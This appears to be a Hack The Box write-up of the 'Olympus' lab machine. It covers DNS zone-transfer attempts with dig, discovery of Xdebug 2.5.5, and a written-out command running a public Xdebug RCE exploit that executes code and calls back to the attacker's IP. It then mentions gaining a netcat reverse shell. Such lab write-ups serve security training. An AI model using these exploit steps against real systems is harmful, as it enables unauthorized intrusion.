## HTB Olympus (Medium) - Writeup

Difficulty: Medium

Olympus was a well-designed box involving DNS exploitation and Wi-Fi cracking, with containerization playing a key role throughout the journey.  
Privilege escalation was achieved through a misconfiguration, making for a solid and enjoyable challenge.  
---

## Nmap 

#### The nmap scan revealed three open and one filtered port:

![obraz](https://github.com/user-attachments/assets/981edf0e-18d3-4d26-9ee1-a08c7fdad02c)




## Port 53 - DNS

We can try to look for hidden domain names with dig command:  
```
dig axfr @10.10.10.83 olympus.htb
dig @10.10.10.83 olympus.htb
```
![obraz](https://github.com/user-attachments/assets/b225b181-6a1f-423a-9784-0f70a2b06b59)

Domain name olympus.htb was just my guess based on HTB naming convention.  




## Port 80 - Website 

![obraz](https://github.com/user-attachments/assets/1c397e3e-bf48-4433-84ee-1aa3c1c3ed14)

It doesn't contain anything intresting, also feroxbuster didn't found anything.  

Let's take a look at the http response headers.  

![obraz](https://github.com/user-attachments/assets/712a3f78-565e-49db-8cca-12f3a595903d)

Xdebug looks promising, lets research it a bit.  
It turns out that xdebug is a php tool and 2.5.5 is a version.   

After a quick search I found an RCE exploit for this tool.  
```
https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py
```

Let's try to get basic code execution with it:  
```
python3 exp.py -t http://10.10.10.83/index.php -c 'shell_exec("id");' --dbgp-ip 10.10.14.14
```
![obraz](https://github.com/user-attachments/assets/f180588b-d66d-4cd5-9865-bfa444900d88)

It worked, now we can try to get a shell access, I'll try netcat shell first.  
We will start netcat listener on port 9005 and run:  

![obraz](https://github.com/user-attachments/assets/2ae2d5d6-6800-4ffa-bd86-23fbeb33efd9)

We were lucky, it turned out that our target had netcat with -e option installed which led to initial access.  

![obraz](https://github.com/user-attachments/assets/fc520114-fb0f-42b9-b3c2-25cc7ec499d0)

After a quick enumeration we see that it is likely a container, hostname is weird, and ip differs from the original one.  
Also python is not installed meaning we can't upgrade a terminal.  

































